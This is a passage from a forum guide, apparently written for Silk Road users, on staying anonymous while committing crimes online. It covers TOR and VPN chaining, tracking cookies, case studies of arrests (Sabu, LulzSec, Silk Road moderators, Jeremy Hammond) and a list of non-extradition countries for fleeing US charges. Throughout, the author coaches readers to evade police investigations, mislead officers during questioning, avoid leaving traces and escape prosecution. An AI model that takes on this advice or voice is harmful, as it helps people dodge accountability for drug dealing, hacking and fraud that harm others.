nothing on you, or something for that matter. Act scared, anxious and confused. Act like you have no idea what is going on and that you are scared for your life. Tell the cops they are scaring you and you want to see your lawyer because you do not know what this is about. They need evidence, and solid evidence at that, to charge you with a crime. They are going to try and correlate posts you made on forums, phone numbers you called, perhaps a package shipped to your home, all forms of communication, bank transfers, and so forth, until they can find a way to link you to the crime you are being accused of. But the biggest piece of evidence will always be your willingness to admit your guilt for a lesser sentence. When Sabu found that he was facing 112 years in federal prison, he quickly spilled everything and started working for the feds. Again, talk to your lawyer, find out the evidence against you and only answers questions your lawyer advises you to answer, and answer them in a way your lawyer advises you to answer them. Try and be as honest as possible with your lawyer. Your lawyer can not and will not share any admittance of guilt you have with the prosecutors or LE, this is called Attorney-client privilege. Please note there are a few instances where this does not apply. https://en.wikipedia.org/wiki/Attorney%E2%80%93client_privilege#When_the_privilege_may_not_apply COMBINING TOR WITH A VPN Welcome back readers! Today I want to talk about a greatly debated topic. Should I use a VPN with TOR?Should I use TOR to connect to a VPN, or use a VPN to connect to TOR? Let me say first of all, that when you are browsing the internet without TOR, you should probably be using a VPN regardless of whether or not you are using TOR. And make sure that the VPN uses some form of encryption as well. For those of you who are very beginner, think about when you connect to a public wifi network at a coffee shop, or an airport and you get all these warnings that your requests sent over this network are vulernable. All networks, but especially public wifi networks are vulnerable to traffic analysis. Put this together with the fact that some internet service providers monitor your activity to some level, and you can see why it might be a good idea to always use an encrypted method of using the internet. At the very least to protect your personal information when you are entering credit cards, usernames and passwords, as well as other personal data online. Again, especially if you are using a public wifi network. Choosing a VPN that uses at least 128 bit encryption like TOR is good practice, and will stop the majority of eavesdroppers. But if you can get 256 bit encryption, you are even safer. Before we get into whether or not we should be using a VPN together with TOR, I want to give you a few warnings regarding how you should be using a VPN. If you are going to be using a VPN for any type of freedom fighting, make damn sure that your VPN does not keep logs. This is actually a lot harder than you might think. Many VPN providers will claim to not keep logs of your activity in order to gain you as a customer, because they have to compete with the other providers out there. Customers are going to trend towards providers who offer no identifying data retention. Unfortunately, this claim of theirs is not always the real case and I will give you an example. There is a well known VPN provider named HideMyAss that previously claimed not to keep logs of its users. Unfortunately, when met with a court order from their government in the UK, they handed over evidence of a suspected hacker from an internet group LulzSec which helped lead to his arrest. The story can be found below. http://www.theregister.co.uk/2011/09/26/hidemyass_lulzsec_controversy/ One of the take home quotes from this article is the following.Quote     We are not intimidated by the US government as some are claiming, we are simply complying with our countries legal system to avoid being potentially shut down and prosecuted ourselves. A very smart man that goes by the online handle The Grugq, said when doing your freedom fighting online that nobody is going to go to jail for you, and he is 100% correct. When it comes down to it, no VPN provider is going to risk jail to protect a $20 a month subscriber. No matter how tough they sound, no matter how much they claim to care about protecting their customers, when faced with a choice to give you up or go to jail, they will always choose freedom. Another thing to consider however, is using a VPN does hide your internet activity from your internet service provider. It can also hide the fact that you are using TOR, which may flag some suspicion when the feds start asking ISPs to provide data about their users. This may or may not be relevant, since many people use TOR and you can argue there are many legitimate reasons to use TOR and nothing suspicious about TOR. But it is just another factor to arouse suspicion that may or may not come into play and should be considered. If you choose to use TOR over a VPN, the benefits are that you would be again, hiding from your ISP the fact that you are using TOR. Also, your VPN would only be able to see that you are connecting to TOR nodes and that you are sending encrypted data. The VPN would not be able to see what data you are sending over TOR unless they decrypted it, because remember, all information relayed over TOR is encrypted. The downsides of course, as mentioned are that VPN providers may or may not log everything that you do in the form of meta data or even content if they have the storage capacity, and keep those logs on hand for a long time. In this case, it is no better than connecting to TOR through an ISP. Another thing to mention to those who will use VPNs when not using TOR, but also use VPNs when using TOR is remember when you are, and are not connected to your VPN. Sometimes VPNs can unexpectedly drop connections and you may not even be aware of it. If the reason you are using a VPN is to hide TOR activity from your ISP, then if your VPN drops, your ISP will start seeing your TOR traffic instead. Or, maybe you forget that you are connected to your VPN and end up punching in your address on Google Maps to find directions somewhere. Well guess what Google does with all data entered into their system? They keep it. And they likely keep it indefinitely. So if one day the NSA identifies you on the TOR network by occupying a large number of nodes and using traffic analysis to identify you based on statistical analysis, it will link them to your VPN IP address. At this point, they will likely ask the VPN to turn over data on their users, but if the VPN refuses to comply because they are not subject to US law, or the laws of other countries, they may check some of the big surveillance websites out there to see if you slipped up and used that IP address for anything else online. They will check logs from Google, Yahoo, Facebook, Twitter, Netflix and other big data collection companies to see who has been using that IP address to connect to their servers. If you accidentally punched in your address on Google when connected to that VPN, you are now a suspect. So always keep things like this in mind. Just because you are covered behind a VPN does not mean you are not traceable by human error. The benefits of TOR, are that you get a new identity every time you connect. This may or may not be the case with your VPN, so please check and make sure. COMBINING TOR WITH A VPN CONTINUED Ok, now let us talk about why you may want to connect to a VPN over TOR. The data flow would look like this. You -> Tor -> VPN -> Internet The benefits of doing that are as follows. You are more anonymous to your VPN in case they happen to keep logs, or if you do something using the VPN that you are not supposed to and a website or server grabs your VPN IP address. In the case of this happening, even if the VPN manages to keep logs of everything you do, they can only identify you as an anonymous TOR user as long as you did not purchase the service like an idiot with your credit card or Paypal account. If you use Bitcoin, and made sure the the Bitcoin trail is not easily traceable you should be okay. Some websites block TOR users from connecting to their websites or servers, by using your VPN to appear as the exit node, you are hiding your TOR activity from the website you are visiting and hopefully bypassing their filters. Another advantage, is that if your VPN connection does drop, your fall back will be your TOR IP address instead of your real IP address. And finally, if you are passing through a compromised TOR exit node, your information will remain encrypted through the VPNâs encryption protocol until it reaches the exit node of the VPN. This is a good thing if you are passing through a compromised exit node, but do not forget that the VPN could be logging everything you are doing anyways. Do not trust anybody who has access to your unecrypted data! A few of the downsides of doing things this way, as mentioned in the previous post are that your ISP knows you are using TOR, when and for how long. This may or may not matter to you, but it is just something to consider. Second, you will be unable to visit hidden services websites. Remember those .onion sites we talked about in the beginning? You need to be connected to the TOR network to visit those hidden service websites. But I am connected to TOR arenât I? Yes you are, but your final method of communicating with the internet does not come from the TOR network, it comes from your VPN. And your VPN is likely not configured for TOR. In order for you to be able to connect to a hidden services, you must either be connected directly to TOR, or use a VPN to connect to TOR. TOR must be your final node of connectivity in order to visit onion websites. The choice is ultimately up to you, and every person in every state, province and country will have different reasons for wanting to do VPN to TOR or TOR to VPN, or just TOR, or just VPN. Whatever choice you make, please keep all the things mentioned in this post and the previous post in mind. None of these methods will save you if you enter anything identifying about yourself online. Do not log into your Facebook account using your VPN. Do not check your email or search a nearby address on Google using your VPN. In fact, stay away from Google altogether unless absolutely necessary. There are two other search engines out now that do not store information about their users. #1 â DuckDuckGo. They have both a clearnet URL and a hidden services URL for both types of users. https://www.duckduckgo.com http://3g2upl4pq6kufc4m.onion/ â Please note the hidden services mirror is not HTTPS #2 â StartPage. This server also does not store any information about its users. https://www.startpage.com Before we move on, I want to go back to how to choose a good VPN. When looking for a VPN provider, you will most likely come across two protocols to choose from. Find out which one your VPN provider is using before you sign up with them. PPTP and OpenVPN. At this time, I am going to highly recommend that you avoid PPTP and stick with OpenVPN providers. Check out this site for a quick comparison. http://www.goldenfrog.com/vyprvpn/openvpn-vs-pptp As you can see, PPTP uses a weaker encryption, 128-bit versus 160-bit to 256-bit for OpenVPN. It offers basic security versus a high level of security using something called digital certificates. This is basically a way to make sure they data coming in is sent from your VPN provider and not injected by some malicious third party because the incoming and outgoing data are signed using specially obtained certificates, similar to showing your ID to get into a a restricted area. The only downside is that setting up OpenVPN can be a little challenging for the less technical users, but there are plenty of great tutorials online to set up OpenVPN providers and your VPN provider itself will likely help you get set up as well. PPTP has been abandoned by those who demand the highest level of security, so I would recommend to avoid it. A third option for VPN providers is L2TP/IPsec, but many users now believe it has also been compromised by the NSA due to its weaker levels of encryption and should be avoided as well. Stick with OpenVPN. Lastly, if you want to know how to connect to TOR over a VPN. If you are using OpenVPN like I recommended, then you it is really quite simple. Make sure you are connected to your VPN, check your IP address to on any website such as WhatIsMyIpAddress.com to make sure it has changed. Then, open TOR or open TAILS and start using TOR and you are now connected to TOR over a VPN. Connecting to a VPN over TOR is a more tricky and currently above my skill set since OpenVPN reconfigures your network routes so Tor canât be running on the same host. As soon as I figure it out, I will post a tutorial, and if anybody can share an easy way to connect a VPN over TOR, then please share it with this thread. UPDATE A method of connecting to a VPN over TOR has been added to this thread but is currently only able to be used by Windows users. You can read it about it at the link below. CONNECTING TOR -> VPN FOR WINDOWS USERS After a long search, I have found a way you can connect TOR -> VPN. It is not perfect, and some might not agree with doing things this way, but it works and I am giving it to you as an option, but it only works for Windows users at this time. If you look back at my previous posts regarding combining VPN and TOR then you will find the reasons why you would want to do so, and some of the reasons why you might not want to do it. But I was unable to provide you with a way to connect to a VPN using TOR so that the VPN does not know who you are. When it comes to TOR -> VPN, if you cannot trust your VPN, which you rarely should, then keeping your identity anonymous from your VPN is a good idea. Also, with more and more people using TOR, but with only around 4000 TOR exit nodes, many of the exit node IP addresses are being flagged as spammers on popular websites and limiting the usage of well meaning TOR users to post on message boards like Stack Exchange and so forth. The way that I found you can do TOR -> VPN is by using a virtual machine, preferrably Virtual Box and running another instance of Windows, preferrably one that uses less memory than your current version. You also want to run TOR Expert and Tortilla on your host OS. I talk about how to do this in previous posts. Next set your Virtual Box to route all itâs network traffic through Tortilla (bridge adapter), which routes it all through TOR. Currently Tortilla is only supported by Windows, which is why this option is only available to Windows users at this time. Doing this also makes it easier to do things like watch videos on YouTube. Now that you have your Windows Virtual Machine running on TOR, you can install a VPN of your choice, preferrably one using OpenVPN on your Windows Guest OS and connect to it. Check your IP address before connecting and after and you should see a different IP address. If all went well, you now have a virtual machine running TOR -> VPN. Then if you want to add another layer, you can download TOR browser bundle onto your virtual machine and run that as well giving you TOR -> VPN -> TOR for another layer of security.  Also you have the option using this method to use a VPN on your host OS, then Tor Expert with Tortilla, then another VPN on your guest OS, then TOR browser, giving you VPN -> TOR -> VPN -> TOR. I am not advocating any whcih method, you need to make that decision on your own, I am just giving you the knowledge necesary to make an informed decison and you can ultimately choose which method you feel most comfortable with. Sometimes doing TOR -> VPN is necessary because of the spam filter reasons I mentioned above and other times having TOR as your last node to the internet is necessary like when accessing the onion network. It is completely up to you and I know that we are trying to shy away from Windows usage because of all the exploits and other reasons spoken about in the previous posts, but if you have no other way of staying anonymous from your VPN than this, then I think it is a good compromise until we have something like Tortilla that is compatible with Linux distributions. TRACKING COOKIESNext time I want to talk about is something that most people completely forget about. Tracking Cookies. A recent article explains how the NSA uses things like Google Ads and other tracking cookies to identify users over TOR when doing so by other means is not possible. http://www.washingtonpost.com/blogs/the-switch/wp/2013/12/10/nsa-uses-google-cookies-to-pinpoint-targets-for-hacking/ For those of you who do not know what I am talking about, let me ask you this. Have you ever noticed that certain ads seem to follow you around from website to website? Perhaps something you searched for on Google or Yahoo is now showing up in ads on other pages? This was originally designed to market things to you based on your preferences by installing tracking cookies into your browser. Luckily TOR clears its cookies every time you restart the browser, and yes Tails does too, but that does not mean you are not vulernable within the same TOR session. What I mean by this is, let us say you went and did some freedom fighting on a forum somewhere and then after, using the same Tor session, visited another website with Google Ads on it. Then you went to another site with more Google Ads on it. You would be surprised how many sites now have Google Ads on them, by the way. Google can use these tracking cookies to learn about your browsing behavior. Your search terms, your preferred sites, and so forth. Some people are even stupid enough to use the same TOR IP address and go check their Facebook news feed or their email. Guess who is in bed with the feds? Google, Yahoo, Facebook, MSN, and all of their email providers as well. Remember, when you start leaving patterns behind, they will start looking for similarities that start with just a suspicion. Perhaps they correlated the freedom fighting forum posts with you because you logged into your email, and now they start noticing that you always misspell the same words, make the same grammar mistakes, the same slang terms. Perhaps you visited a website belonging to somebody local to you with Google Ads on it. It is not entirely sure how they are able to use these tracking cookies to identify you, but the point is, they keep everything. And if you happen to do something stupid like Google a local restaurant or what movies are playing in your local area on the same IP address that you did something you should not have earlier on, then Google can put 2 and 2 together. Once they are on your trail, you are screwed. So do not give them anything to correlate to you, ever! So then you might ask, can not I just disable cookies all together? Yes you could, but, cookies are required for things like login sessions. Without cookies, you are unable to maintain a state of being logged in on certain websites, because they use that cookie ID to identify the session on the server. Again, you can certainly disable cookies, but you will not be able to maintain a login anywhere. LEARNING FROM OTHERSâ MISTAKES. LIBERTAS, DPR, SABU, LULZSECA little change of pace for this next post. I want to talk about one of our fallen moderators Libertas. It has finally been confirmed, what we all were hoping for that Libertas, one of the 3 arrested moderators was released on bail recently according to an article. http://techcrunch.com/2014/01/07/the-silk-roads-libertas-is-free-to-the-annoyance-of-us-authorities/Quote     The Silk Road moderator Gary Davis, aka Libertas, is officially free on bail and awaiting an extradition hearing on February 13.     The FBI flew to Ireland that night for the express purpose of taking Davis into custody and interrogating him in Ireland, with regard to his position and functions âbeing a moderator on a website allowing transactions to facilitate the sale of drugs online.â So as you can see, just because Libertas was a moderator on the site, he is being charged with allowing transactions to faciliate sales of drugs. He is basically being charged as a drug dealer.Quote     However, Davis was found in possession of illicit substances which could result in a minimum sentence. He unfortunately was found with drugs on him at the time of his arrest, which made things much easier to keep him in custody. And it turns out that the alleged former owner of Silk Road, Ross Ulbricht is fully complying with law enforcement to attempt to identify senior vendors on Silk Road. According to the article, Ross communicated with the vendors frequently and likely in plain text (is my guess). The reason I bring this up, is that we need to remind every user on here of the mistakes that were made by Ross, and the other three moderators so that we can hopefully learn from them. We need to avoid these types of mistakes, never ever EVER give anybody any personal information about yourself online. The story goes, that Ross required moderators to give him copies of their IDs in order to become moderators of Silk Road, and he likely kept a record of these on his computer. Unfortunately, these are now in the hands of the FBI and 3 moderators have been arrested as a result since. And now, according to the article, they are after senior vendors as well. A few take homes are; Always use PGP encryption in all your communications, which unfortunately in this case would not have mattered because Ross ended up giving up his private keys to the feds. But it is still another hurdle in their way to protect you from them taking away your freedom. Never give out any personal information to anybody online about yourself. Never put your trust in somebody elseâs hands, because at the end of the day, nobody is going to go to jail for you. Ross found an opportunity to possibly reduce his sentence and he is fully taking advantage of the opportunity. This exact same scenario happened with Sabu from LulzSec was threatened with 112 years in prison, he quickly turned on all his friends and worked with the feds to get them all locked up to help reduce his sentence. Sabu has 2 kids and obviously decided he would rather snitch out his friends and have a chance at being a father rather than spend the rest of his life locked up in jail. Again, nobody is going to go to jail for you. HOW FAR WILL LAW ENFORCEMENT GOToday we are going to talk about the lengths that law enforcement (LE) will go to try and catch you slipping. The thread that inspired this post was the following SR thread. http://silkroad5v7dywlc.onion/index.php?topic=8788.0 The first question is, can LE ship drugs to buyers to try and set them up for drug charges? Let us just say, that they have done it to a Silk Road user before who went by the name of Flush aka Chronicpain aka Curtis Green http://www.usatoday.com/story/news/nation/2013/11/07/vendor-administrator-plead-guilty-in-silk-road-case/3469751/Quote     In April 2012, a DEA undercover agent in Maryland posing as a drug smuggler began communicating with âDread Pirate Robertsâ on Silk Road about selling a large amount of illegal drugs. âDread Pirate Robertsâ instructed [Curtis] Green to help the smuggler find a drug dealer who could buy a large amount of drugs, court papers say. Green found a buyer and agreed to act as the middleman for a $27,000 sale of a kilogram of cocaine. Green gave the DEA agent his address.     An undercover U.S. Postal Service inspector delivered the cocaine to Greenâs house in Utah on Jan. 17. So as you can see, whether you view it as entrapment or not, once they have evidence against you, they will eventually figure out a way to get something on you and bust you for it like they did to Curtis Green. The Secret Service posed as a vendor for fake IDs online for 5 years and actually shipped fake IDs that they made to buyers on an online Russian forum. http://www.tested.com/tech/456882-how-secret-service-sold-fake-ids-catch-identity-crooks/Quote     The US Governmentâs âOperation Open Marketâ resulted in indictments against 55 defendants. According to Wired, Special Agent Mike Adams shipped out more than 125 fake IDs over about five years of activity while going by the username Celtic. Amazingly, the entire scheme started when the government arrested the real Celtic, a Nevada man who got caught shopping at a Whole Foods where heâd previously used a fake credit card.     Law enforcement discovered counterfeiting equipment among his possessions and learned about his online activities. Adams assumed his online identity and even improved Celticâs cred, shipping near-flawless IDs and becoming a trusted seller on Carder.ru. As you can see in this article, the Secret Service again sold illegal items to people online in order to bust them. Several of the buyers used their real addresses and sent real photos of themselves to this officer to have their IDs made, resulting in being arrested by the feds. And in this particular case, the feds charged all the defendants under something called the RICO act.Quote     âThe main indictment is noteworthy because, in addition to the usual mix of credit card fraud and false identification charges, the 39 defendants have been charged under the mob-busting RICO act â a first for a cybercrime prosecution.     Enacted in 1970 to help the FBI crack down on the mafia, the Racketeer Influenced and Corrupt Organizations Act lets the feds hold every member of a criminal organization individually responsible for the actions of the group as a whole. The losses collectively inflicted by the Carder.su members are easily enough to give every RICO defendant 20 years in prison.â When you commit crimes online, especially in an online community, the feds may be able to hold you accountable for the actions of other users on that same community. So make sure when you do your freedom fighting, or whatever you choose to do, that you take this into considering. Always weigh out the worst case scenario, should you get busted, because the LE will try and set you up. One last example of how LE will try and set you up, but not relating to online communities is when they put together a fake sweepstakes in Los Angeles. http://www.nbclosangeles.com/news/local/La-Mirada-Inspired-by-the-Simpsons-to-Catch-Criminals-78093912.htmlQuote     Sheriffâs deputies in La Mirada attempted a rope-a-dope on some alleged criminals by offering them a fake sweepstakes prize. Out of the 960 letters sent to these âpeople of interestâ only eight showed up at the La Mirada Holiday Inn to collect their prize, according to the Whittier Daily News.     Posing as the âPelican Marketing Group,â deputies sent letters last week to people throughout the county wanted in connection with crimes ranging from misdemeanor warrants to murder.     According to the report, the suspects were advised to bring their letter and identification to the Holiday Inn, and told that they were guaranteed a prize worth at least $100, and would be one of 200 people with a chance to win a 2010 BMW 238i sedan.     They were all smiles when they showed up to collect their prizes, Deputy Janet Ramirez told the newspaper. âOnce they tell them theyâre under arrest, the smile fades quickly,â she said. So the reason I made this post, was for those of you who think that LE will not go to certain lengths to try and set you up for charges. They will do it if they want you bad enough, and if you fall for it, they might get you on some tough charges. Curtis Green is facing up to 40 years for the sting operation by the DEA on him and the users who purchased fake IDs on the Russian forum could face up to 20 years each since they can be charged under the RICO act. Always keep these things in mind when conducting activities online and always take the worst case scenario into account. It only takes one mistake to get caught and the government has unlimited resources and super computers to try and catch you slipping. You may only have a few laptops, desktops, servers, but nothing compared to the what they have. Be careful everyone. LEARNING FROM OTHERSâ MISTAKES. HOW THEY BUSTED SABUThis next post I want to focus on more mistakes that other hacktivists and freedom fighters have made which ultimately led to their arrests. This is more proof that you only need to screw up once. You have probably heard me talk about somebody named Sabu multiple times and maybe you are new to the online communities and you have no idea who I am talking about. Sabu was the leader of a self proclaimed hacktivist group called LulzSec. They were responsible for taking advantage of security exploits in online servers and posting the information online on a website called PasteBin. They had done this many times. https://www.informationweek.com/attacks/lulzsec-leader-sabu-unmasked-aids-fbi-hacker-sweep/d/d-id/1103214?Quote     The men have been charged with hacking Fox Broadcasting Company, Sony Pictures Entertainment, and the Public Broadcasting Service (aka PBS). During the time all this was happening, the members of this group maintained an online Internet Relay Chat (IRC) channel in which they regularly discussed and took credit for their attacks and exploits. The agreed upon ring leader for these attacks, and this group went by the online handle Sabu. Sabu had also been linked to selling stolen credit cards on Facebook through his online handle, not his real one, which carries a charge of aggravated identity theft. The group had leaked identities of law enforcement, Sony users, and all wreaked all types of havoc online including DDos attacks on the CIA. The FBI wanted Sabu, they wanted the ring leader, who would eventually be facing charges that could lead to 112 years in prison. But as I mentioned in previous threads, it only takes one mistake to get caught. That is all they need. http://www.foxnews.com/tech/2012/03/06/exclusive-unmasking-worlds-most-wanted-hacker/Quote     Sabu had always been cautious, hiding his Internet protocol address through proxy servers. But then just once he slipped. He logged into an Internet relay chatroom from his own IP address without masking it. All it took was once. The feds had a fix on him. However, this was not his first actual slip up, but it was his first slip up where the feds actually discovered his mistake. His identity was actually discovered, or âdoxedâ previously by another online hacking group called Backtrace who posted his identity and general location online weeks prior to this in an attempt to dox members of LulzSec. http://arstechnica.com/tech-policy/2012/03/doxed-how-sabu-was-outed-by-former-anons-long-before-his-arrest/Quote     Sabu occasionally mentioned ownership of a domain called prvt.org in his chats, including those in Backtraceâs âconsequencesâ document. Every domain registration is associated with corresponding information in the WHOIS database. This information is supposed to include the name and address of the domainâs owner.     Often this information is incorrect (most domain registrars do nothing to validate it) or anonymized (many firms offer âproxyâ domain registration, so the WHOIS database contains the details of the proxy registrar, rather than the person using the domain). Monsegur appeared to use one of these anonymizing services, Go Daddy subsidiary Domains By Proxy, for registering the prvt.org domain.     The registration for the domain was due to expire on June 25, 2011, requiring Monsegur to renew it. But for some reasonâerror on Monsegurâs part perhaps, or screw-up by the registrarâthe renewal was processed not by Domains By Proxy but by its parent, Go Daddy. Unlike Domains By Proxy, Go Daddy uses real information when it updates the WHOIS database, so on 24th June (the day before it was due to expire), Monsegurâs name, address, and telephone number were all publicly attached to his domain name.     Monsegur quickly remedied the mistake, changing the WHOIS registration to use various other identitiesâfirst to that of Adrian Lamo (who reported Bradley Manning to authorities) and then to âRafael Limaâ and subsequently to âChristian Biermannâ. This attempt to mislead those relying on the WHOIS information successfully misled some would-be doxers. But not all: by August there were extensive dossiers on Sabuâs true identity. Two mistakes that we know of, is all that it took to bring down at one time, the Worldâs Most Wanted Hacker. If you are familiar with the story of LulzSec, there was a time they were receiving mainstream news coverage and Sabu had gained a reputation of being this mystical untouchable hacker. Unfortunately for him, he made two small yet very costly mistakes which ended up putting him away. But we are not done yet on this story about Sabu. Sabu had a weakness, that the feds used as leverage against him when he got busted.Quote     An unemployed computer programmer, welfare recipient and legal guardian of two young children.     âIt was because of his kids,â one of the two agents recalled. âHeâd do anything for his kids. He didnât want to go away to prison and leave them. Thatâs how we got him.â     Monsegur was quietly arrested on aggravated identity theft charges and released on bail. On Aug. 15 he pleaded guilty to a dozen counts of hacking-related charges and agreed to cooperate with the FBI. So when you are doing your freedom fighting online, you need to ask yourself. What do I have to lose? Do I have a wife? Children? What would happen if I were to lose everything and be thrown away for 10 to 20 years, could I handle that? If you decide that you are willing to risk all that, then you again need to learn from the mistakes of those who have fallen before you. Ask yourself, if put in a hard place, where you had to choose between life in prison, and cooperation, in order to see your own family, you may think you will not talk now, but you may start talking when the feds are threatening to take them away from you forever. Once the FBI had the leader of the group LulzSec working for them, they wasted little time getting the former hacker to turn on his friends and aid in their arrests. LEARNING FROM OTHERSâ MISTAKES. SABU BECAME FBI INFORMANT AND BETRAYED JEREMY HAMMONDWe are continuing the subject of how others were taken down after Sabu was compromised and started cooperating with the FBI. According to this article. http://arstechnica.com/tech-policy/2012/03/stakeout-how-the-fbi-tracked-and-busted-a-chicago-anon/Quote     The day after Christmas, sup_g had another online chat about the Stratfor hack and about some 30,000 credit card numbers that had been taken from the company. His interlocutor, CW-1, engaged in a bit of gallows humor about what might happen should they all get caught.     But the raid had, in fact, already happened. CW-1 was âSabu,â a top Anon/LulzSec hacker who was in real life an unemployed 28-year old living in New York City public housing. His sixth-floor apartment had been visited by the FBI in June 2011, and Sabu had been arrested and âturned.â For months, he had been an FBI informant, watched 24 hours a day by an agent and using a government issued laptop that logged everything he did. So we see here Sabu is chatting with a user sup_g to try and engage him about the hacks that took place.Quote     Sabu suddenly addresses sup_g by a new name, âanarchaos.â It would turn out that sup_g went by many names, including âanarchaos,â âburn,â âyohoho,â âPOW,â âtylerknowsthis,â and âcrediblethreat.â     CW-1: if I get raided anarchaos your job is to cause havok in my honor    CW-1: <3    CW-1: sup_g:    @sup_g: it shall be so     Normally, the attempt to link his various names would have raised the hackerâs guard; as he confided to Sabu, someone else had once tried to link the names âyohohoâ and âburn,â but the hacker ânever answeredâ¦ I think he picked up some language similarities Iâve worked with [REDACTED] on other ops in the past.â But this was Sabu, a sort of hacker demigod in the world of Anonymous. If you couldnât trust him, who could you trust? Sabu had even provided a server to store the stolen Statfor data, so he couldnât be a fed (in reality, he had done so at the FBIâs direction). And more details on how they looked through copious amounts of logs to correlate this user sup_g to his real identity.Quote     To identify sup_g, the Bureau first turned to the voluminous chat logs stored on Sabuâs computer. They went through every comment that could be plausibly linked to sup_g or one of his aliases. The goal was to see if the hacker had slipped up at any point and revealed some personal information.     He had. On August 29, 2011 at 8:37 AM, âburnâ said in an IRC channel that âsome comrades of mine were arrested in St. Louis a few weeks agoâ¦ for midwestrising tar sands work.â If accurate, this might place âburnâ in the Midwest. FBI Chicago agents were able to confirm that an event called Midwest Rising was attended by Chicago resident Jeremy Hammondâs twin brother. (Hammond had a history with anarchism and violent protest.)     âAnarchaosâ once let slip that he had been arrested in 2004 for protesting at the Republican National Convention in New York City. Much later, âyohohoâ noted that he hadnât been to New York âsince the RNC,â nicely tying both online handles to the same person. The FBI went to New York City police and obtained a list of every individual detained at the 2004 convention; they learned that Jeremy Hammond had in fact been detained, though he had not been arrested. The pieces were starting to fit.     âSup_gâ and âburnâ both indicated later that they had spent time in prison, with âburnâ indicating that he had been at a federal penitentiary. A search of Hammondâs criminal records revealed that he had been arrested in March 2005 by the Chicago FBI and had pled guilty to hacking into a âpolitically conservative website and stealing its computer database, including credit card information,â according to an FBI affidavit. Hammond was sentenced to two years in prison for the action.     In yet another chat, âAnarchaosâ told Sabu that he had once spent a few weeks in a county jail for possession of marijuana. He also asked Sabu not to tell anybody, âcause it could compromise my identity,â and he noted that he was on probation. Both matched Hammond, who was placed on probation in November 2010 after a violent protest against the Olympics coming to Chicago. When the FBI ran a criminal history check on Hammond, it also revealed two arrests for marijuana possession.     The FBI was so thorough that it even followed up on a âPOWâ comment saying âdumpster diving is all good iâm a freegan goddess.â (âFreegansâ scavenge unspoiled, wasted food from the trash of grocery stores and restaurants.) The FBI went to Chicago authorities, who had put Hammond under surveillance when they were investigating him back in 2005. As part of that earlier surveillance, âagents have seen Hammond going into dumpsters to get food.â     Now that they had a suspect, it was time to put him under surveillance. This is why you all need to be extra paranoid with every single thing you say about yourselves on this forum. I have seen people talking about what country they live in, some even talking about which state they live in. If you think that the FBI will never put the pieces together, you may be sadly mistaken as Jeremy Hammond found out.Quote     Watching the WiFi network revealed the Media Access Control (MAC) addresses of each device connected to the network. Most of the time there was only one, an Apple Computerâand sup_g had told Sabu that he used a Macbook.     On March 1, the agents obtained a court order allowing them to use a âpen register/trap and traceâ device that could reveal only âaddressing informationâ and not content. In other words, if it worked, agents could see what IP addresses Hammond was visiting, but they would see nothing else.     His Macbookâs MAC address was soon seen connecting to IP addresses known to be part of the Tor anonymizing network.     And while this definitely sounded like their man, the Bureau went to even greater lengths to double-check their target. The main technique was to observe when Hammond left his home, then to call Sabu in New York and ask if any of Hammondâs suspected aliases had just left IRC or the Jabber instant messaging system. If this does not open your eyes to some of the mistakes many of you have been making online, then you need to reevaluate how you handle yourselves online. Read the entire article to get a better picture, but remember, I do not care if it is your best friend from elementary school, do not, under any circumstances ever admit anything online to anybody. Never under any circumstances take credit for any freedom fighting or hacktivism you have participated it online. And for christâs sake, NEVER log into a server, especially one that keeps logs with your real IP address! WHERE YOU MIGHT CONSIDER RUNNING TO, IF YOU HAD NO OTHER CHOICEIn the case that you may have to run, here are some things to consider. I am not an expert on evading extradition, or how to evade the federal government, NSA or other super powers, but I do have some recommendations that you might want to consider if you decide that you have no other choice but to run. The following countries do not currently have an extradition treaty to the United States.Quote     Afghanistan, Algeria, Andorra, Angola, Armenia, Bahrain, Bangladesh, Belarus, Bosnia and     Herzegovina, Brunei, Burkina Faso, Burma, Burundi, Cambodia, Cameroon, Cape Verde, the Central     African Republic, Chad, China, Comoros, Congo (Kinshasa), Congo (Brazzaville), Djibouti, Equatorial     Guinea, Eritrea, Ethiopia, Gabon, Guinea, Guinea-Bissau, Indonesia, Ivory Coast, Kazakhstan,     Kosovo, Kuwait, Laos, Lebanon, Libya, Macedonia, Madagascar, Maldives, Mali, Marshall Islands,     Mauritania, Micronesia, Moldova, Mongolia, Montenegro, Morocco, Mozambique, Namibia, Nepal,     Niger, Oman, Qatar, Russia, Rwanda, Samoa, SÃ£o TomÃ© & PrÃ­ncipe, Saudi Arabia, Senegal, Serbia,     Somalia, Sudan, Syria, Togo, Tunisia, Uganda, Ukraine, United Arab Emirates, Uzbekistan, Vanuatu,     Vatican, Vietnam and Yemen. This does not mean that these countries will not extradite you, but if you are going to pick a country to flee to, it would be favorable to your chance to choose from this list. One noteable country on this list, which is famous for extraditing one of the owners of the Pirate Bay, Gottfrid Svartholm to Sweden, is Cambodia. Although no treaty exists between the two countries, he was extradited by the government. We all know that Edward Snowden fled to Russia from Hong Kong after leaving the US from Hawaii and has remained there since without being extradited by the government and was granted a 1 year temporary asylum. It is unclear if Snowden will be able to stay longer than his 1 year temporary asylum grants, but as of right now he is badly wanted by the US government, and Russia is refusing to hand him over. Another person involved in the Pirate Bay named Fredrik Neij fled to Laos in Asia following being convicted of âassisting in making copyright content availableâ and was sentenced to one year in prison and ordered to pay damages of 30 million SEK (approximately â¬2,740,900 or US$3,620,000). This is of course between Laos and Sweden, but Laos has not extradited Fredrik, so Laos may be a valid option. I often hear people from the US claim that if âshit ever pops offâ they would just flee to Canada. Do not even try it, you would not even make it through the border. Canada is like the baby brother of the United States. When the United States says jump, Canada says âhow high?â. Stay away from Canada if you are running from the United States. Even a pot activist named Mark Emery who was a Canadian citizen, lived in Canada, but sold marijuana seeds over the internet to people in the US was extradited to the US to serve a 5 year sentence. According to the other seed vendors in the area, those who only sold within Canada had never been arrested, but because Emery sold to the US, he was arrested and extradited. And of course, we know that Ireland and Australia will likely be extraditing two of the moderators from Silk Road to the United States soon enough. Although not on the list above, a woman, wanted in the US for parental kidnapping, named Chere Lyn Tomayko was granted asylum in Costa Rica. http://www.usatoday.com/news/topstories/2008-07-25-3841863361_x.htmQuote     Tomaykoâs claims that her actions were justified by domestic violence she suffered were taken into account by the Costa Rican authorities. Assata Shakur was charged with murder, attempted murder, armed robbery, bank robbery, and kidnapping by the US and fled to Cuba. Cuba actually has an extradition treaty with the US, but the relations between the two countries have not been good since the cold war between the US and the Soviet Union and thus the requests were not honored, even for someone with such serious charges. Cuba may be an option for you, but again this is only something to consider as I am no expert in any way. And finally according to a previous post of mine explaining how the Secret Service sold fake IDs online to people on a forum, several of the members of that forum were able to evade capture due to being in Eastern European countries, although not specified by the feds for obvious reasons, and remain at large to this day. 